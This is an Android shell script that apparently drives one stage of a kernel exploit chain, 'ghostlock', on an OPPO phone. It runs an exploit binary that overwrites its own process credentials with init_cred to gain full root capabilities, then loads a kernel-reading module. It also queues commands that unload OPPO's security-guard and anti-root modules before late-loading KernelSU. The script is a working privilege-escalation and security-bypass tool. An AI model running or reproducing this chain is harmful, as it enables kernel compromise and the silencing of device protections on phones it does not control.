#!/system/bin/sh
# W1c (self): give *this* process root's full credential set by storing init_cred
# into its own real_cred/cred, then install kread_min.ko from inside it and record
# the command that must run with those caps after an out-of-process cleaner has
# erased the forged PI links.
#
# RUN IT THROUGH THE MAGICA ROOT-SHELL CHANNEL -- NOT FROM adb SHELL:
#     adb shell sh /data/local/tmp/gl-w1/rshell 'sh /data/local/tmp/gl-w1/w1c.sh'
# The exploit has to execute inside the Magica server (uid 0, born root, so both
# OPPO checks early-return), while an adb-shell client keeps the app-zygote
# bounding set 0x8000c0 and cannot load a module or open /proc/kread.
#
# Everything is baked in here; nothing has to be passed on the command line.
DIR=/data/local/tmp/gl-w1
LOG="$DIR/w1c.log"
KO=/sdcard/kread_min.ko
# PARK_CMD is a whole shell command line: it runs via `sh -c` in a fork+exec
# child of the parked process, i.e. on a *real* cred with full caps, which is the
# only place that can unload modules or talk to ksud.  Order matters: the OPPO
# modules feed the userspace anti-root reboot, so silence them before loading
# KernelSU; unload guard first, then harden, then the kevent transport (their
# refcounts are 0/0/1-used-by-harden).
PARK_CMD="/system/bin/rmmod oplus_security_guard; /system/bin/rmmod oplus_secure_harden; /system/bin/rmmod oplus_security_keventupload; /data/adb/ksud late-load"

cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_MCAST_SOCKET=tcp6
export GHOSTLOCK_SELF_ROOT=1          # target self (perf pid=0), not adbd
export GHOSTLOCK_W1C_ONLY=1           # stop right after the cred write + repair
export GHOSTLOCK_PARK_AFTER_W1=1      # park: an exit here walks the forged PI tree
export GHOSTLOCK_LOAD_KO="$KO"        # finit_module from *this* process
export GHOSTLOCK_PARK_CMD="$PARK_CMD" # run after cleanup, before the process dies

echo "W1c: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null) ko=$KO cmd=$PARK_CMD"
[ -f "$KO" ] || echo "W1c: WARNING $KO missing -- LOAD_KO will fail"

rm -f "$LOG"
setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W1c: started pid=$PID -- log echoed below (also kept in $LOG)"

seen=0
i=0
while [ $i -lt 120 ]; do
    total=$(wc -l < "$LOG" 2>/dev/null)
    [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi
    if grep -q "W1c-only complete" "$LOG" 2>/dev/null; then
        echo "W1c: DONE -- parked pid=$PID"
        grep -E '^(Uid|CapInh|CapPrm|CapEff|CapBnd|CapAmb)' "/proc/$PID/status" 2>/dev/null
        grep -q '^CapBnd:.*000001ffffffffff' "/proc/$PID/status" 2>/dev/null &&
            echo "W1c: full caps confirmed (CapBnd 0x1ffffffffff)" ||
            echo "W1c: WARNING CapBnd unchanged -- check the repair lines in $LOG"
        grep -E 'LOAD_KO|wrote .*parked\.d' "$LOG" 2>/dev/null
        echo "W1c: do NOT kill pid=$PID; erase its PI state first:"
        echo "      sh /data/local/tmp/gl-w1/gl-chain.sh --apply"
        exit 0
    fi
    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W1c: process exited without completing -- last lines:"
        tail -8 "$LOG"
        exit 1
    fi
    sleep 1
    i=$((i + 1))
done

echo "W1c: still running after 120s (pid=$PID); see $LOG"
exit 2
